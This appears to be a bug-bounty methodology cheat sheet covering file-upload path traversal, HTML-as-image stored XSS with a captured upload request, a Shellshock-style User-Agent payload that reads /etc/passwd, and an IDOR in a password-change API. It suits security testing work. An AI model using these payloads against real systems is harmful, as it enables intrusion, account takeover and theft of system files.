# Methodolgy: FILE UPLOAD

**> Subject: Path Traversal via File Upload**

* 1. Capture the file upload request
* 2. In the filename parameter, change filename to "../../filename" and forward the request.
* 3. See, if the file is getting stored outside the expected directory, if 'yes', it is an issue.
* 4. Now, attempt to overwrite a system file and check if it is possible to overwrite the system file.

</br>

**> Subject: File Upload XSS in image uploading of App**
* 1. Go to App settings and select a html file with .jpg extension.
* 2. Capture upload request using Burp and change the file extension from .jpg to .html, additionaly change the content type to text/html and it will upload the file.
* 3. Open the link of upload image in new file and XSS will pop up.

```
POST /inventory/app_icon/upload/ HTTP/1.0
Host: app.mopub.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRFToken: YZ8hbuu1vB9p5s1ni2vPZ5kMrhMqeDo5
X-Requested-With: XMLHttpRequest
Referer: https://app.mopub.com/inventory/app/97142808ce5d4ace895480a3ffe7d631/
Content-Length: 389
Content-Type: multipart/form-data; boundary=---------------------------1714461176134095862036612614
Cookie: [Cookie values]
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
-----------------------------1714461176134095862036612614
Content-Disposition: form-data; name="image_upload"; filename="xssfileuploadcopy.html"
Content-Type: text/html
HTML content
-----------------------------1714461176134095862036612614--
```


# Methodolgy: LFI

**> Subject: Transversal by User Agent**
* 1. Directory Transversal look for <kbd>GET /cgi-bin/status</kbd> 
* 2. Set the User-Agent to
```
User-Agent: {:;}; echo $(</etc/passwd)
```


# Methodolgy: IDOR

**> Subject: IDOR in the password change functionality**
* 1. Try to change password and capture raw request with Burp Suite

```
POST /api/change_password HTTP/1.1
HOST: redacted.com
Cookie: ci_session= kefrsfdsdfmsdfldgh?h
Accept: application/json

{
    "account":"{username}",
    "password":"{password}"
}
```
* 2. Input any valid user account and input any password


